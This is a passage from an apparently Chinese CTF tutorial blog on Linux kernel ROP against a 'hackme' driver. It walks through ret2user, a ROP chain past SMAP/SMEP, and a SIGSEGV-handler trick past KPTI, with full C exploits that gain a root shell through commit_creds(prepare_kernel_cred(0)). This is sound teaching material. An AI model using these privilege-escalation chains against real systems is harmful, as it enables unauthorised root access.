rdi;\"</span>\n        <span class=\"token string\">\"call rax; mov rdi, rax;\"</span>\n        <span class=\"token string\">\"movabs rax, commit_creds;\"</span> <span class=\"token comment\">//commit_creds</span>\n        <span class=\"token string\">\"call rax;\"</span>\n        <span class=\"token string\">\"swapgs;\"</span>\n        <span class=\"token string\">\"mov r15, user_ss;\"</span>\n        <span class=\"token string\">\"push r15;\"</span>\n        <span class=\"token string\">\"mov r15, user_sp;\"</span>\n        <span class=\"token string\">\"push r15;\"</span>\n        <span class=\"token string\">\"mov r15, user_rflags;\"</span>\n        <span class=\"token string\">\"push r15;\"</span>\n        <span class=\"token string\">\"mov r15, user_cs;\"</span>\n        <span class=\"token string\">\"push r15;\"</span>\n        <span class=\"token string\">\"mov r15, user_rip;\"</span>\n        <span class=\"token string\">\"push r15;\"</span>\n        <span class=\"token string\">\"iretq;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    size_t buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t canary <span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span>  <span class=\"token number\">0x140</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/hackme\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> length<span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    canary <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>get_shell<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"level1-开启-smapsmep\"><a class=\"markdownIt-Anchor\" href=\"#level1-开启-smapsmep\">#</a> level1 开启 SMAP/SMEP</h3>\n<blockquote>\n<p>此时 ret2user 失效，内核态不再能执行用户态代码，那么就需要去找内核中的 gadget 来执行 rop，因为没有开启 kaslr，找到构造出链子即可</p>\n</blockquote>\n<p>使用 ROPgadget 或者 objdump 来找到 gadget ，去执行 commit_creds (prepare_kernel_cred (0))</p>\n<p>这里将 rax 转化为 rdi 的 gadget 就花样百出了，不过也可以从其中找到有用的，比如下面的 gadget 。</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">mov rdi<span class=\"token punctuation\">,</span> rax <span class=\"token punctuation\">;</span> jne <span class=\"token number\">0xffffffff8166fe73</span> <span class=\"token punctuation\">;</span> pop rbx <span class=\"token punctuation\">;</span> pop rbp <span class=\"token punctuation\">;</span> ret</code></pre>\n<p>这条 gadget 前面很符合要求 ，但是后面有一个跳转，我们可以在这之前执行一个 cmp 将 flag 标志位变成不符合跳转要求的情况，这样就能正常继续进入我们的控制流。</p>\n<h5 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h5>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0x4c6410</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0x4c67f0</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x6370</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x7616</span><span class=\"token punctuation\">;</span>\nsize_t pop_rcx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x5f4bbc</span><span class=\"token punctuation\">;</span>\nsize_t pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x424</span><span class=\"token punctuation\">;</span>\nsize_t mov_rdi_rax_jne_pop2_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x66fea3</span><span class=\"token punctuation\">;</span>\nsize_t cmp_rdx_jne_pop2_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x964cc4</span><span class=\"token punctuation\">;</span>\nsize_t swapgs_pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xa55f</span><span class=\"token punctuation\">;</span>\nsize_t iretq_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xc0d9</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span> size_t buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>len<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x%-4x -> 0x%lx\\n\"</span> <span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    pop_rdi_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rcx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    mov_rdi_rax_jne_pop2_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    cmp_rdx_jne_pop2_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    swapgs_pop_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    iretq_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span> <span class=\"token punctuation\">,</span> commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    size_t buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t canary <span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span>  <span class=\"token number\">0x140</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/hackme\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> length<span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    canary <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// vmlinux_base = buf[0x26] - 0xa157;</span>\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// rop[i++] = (size_t)get_shell;</span>\n\n    <span class=\"token comment\">//commit_creads(prepare_kernel_cred(0));</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cmp_rdx_jne_pop2_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mov_rdi_rax_jne_pop2_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> swapgs_pop_rbp_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> iretq_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"level2-开启-smapsmep-kpti\"><a class=\"markdownIt-Anchor\" href=\"#level2-开启-smapsmep-kpti\">#</a> level2 开启 SMAP/SMEP KPTI</h3>\n<blockquote>\n<p>这个时候因为开启了 KPTI ，在执行内核 ROP 返回到用户态时就会段错误。绕过方法可以使用 swapgs_restore_regs_and_return_to_usermode 中的 gadget 来修改寄存器，从而中规中矩的完成返回，另外，可以另辟蹊径使用 signal 函数来绕过 KPTI</p>\n</blockquote>\n<p>具体原理如下</p>\n<p>通过查找下面的信号量表可以发现有个 段错误 信号量 SIGSEGV，那返回到用户态时候不是报段错误吗，我们可以注册一个信号量处理函数来接受这个信号量，在程序报段错误的时候就会去执行它，并切换成用户上下文来调用从而 getshell</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/20201122011130843.png\" alt=\"20201122011130843\"></p>\n<p>比如下面这个例子就将段错误报错转化为了自定义的输出</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"???\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//system(\"/bin/sh\");</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span>SIGSEGV<span class=\"token punctuation\">,</span> shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">114514</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>那么同样的，在内核空间执行 commit_creads (prepare_kernel_cred (0)) 后，段错误转为 shell 函数来拿到 root 权限，这里在 getshell 之后可以看到是新打开的终端获得了 root 权限，也就是 singel 处理函数跑在了 root</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/image-20221012143646688.png\" alt=\"image-20221012143646688\"></p>\n<h5 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h5>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0x4c6410</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0x4c67f0</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x6370</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x7616</span><span class=\"token punctuation\">;</span>\nsize_t pop_rcx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x5f4bbc</span><span class=\"token punctuation\">;</span>\nsize_t pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x424</span><span class=\"token punctuation\">;</span>\nsize_t mov_rdi_rax_jne_pop2_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x66fea3</span><span class=\"token punctuation\">;</span>\nsize_t cmp_rdx_jne_pop2_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x964cc4</span><span class=\"token 